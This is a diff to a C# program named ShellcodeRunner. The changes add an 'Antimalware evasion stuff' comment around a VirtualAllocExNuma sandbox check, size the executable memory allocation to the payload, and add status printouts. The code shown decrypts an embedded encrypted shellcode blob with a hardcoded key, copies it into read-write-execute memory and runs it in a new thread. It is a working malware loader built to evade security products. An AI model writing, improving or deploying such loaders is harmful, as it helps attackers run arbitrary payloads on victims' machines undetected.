@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
@@ -47,6 +48,7 @@ namespace ShellcodeRunner
         }
         static void Main(string[] args)
         {
+            //Antimalware evasion stuff
             IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
             if (mem == null)
             {
@@ -60,6 +62,7 @@ namespace ShellcodeRunner
             {
                 return;
             }
+            //
 
             byte[] key = new byte[32] {
                     0xf0,0x59,0xed,0x11,0xe7,0x8d,0x7a,0xaf,0xf6,0xe9,0xb4,0x57,
@@ -151,10 +154,15 @@ namespace ShellcodeRunner
                 shellcode[i] = Convert.ToByte(decryptedArray[i], 16);
             }
 
+            Console.WriteLine($"[+] Payload decrypted.");
+
             int size = shellcode.Length;
-            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, (UInt32)size, 0x3000, 0x40);
+            Console.WriteLine($"[+] Got allocated memory for shellcode: 0x{(long)addr:X}.");
+
             Marshal.Copy(shellcode, 0, addr, size);
             IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+            Console.WriteLine($"[+] Created thread starting in 0x{(long)addr:X}: 0x{(long)hThread:X}.");
             WaitForSingleObject(hThread, 0xFFFFFFFF);
         }
     }
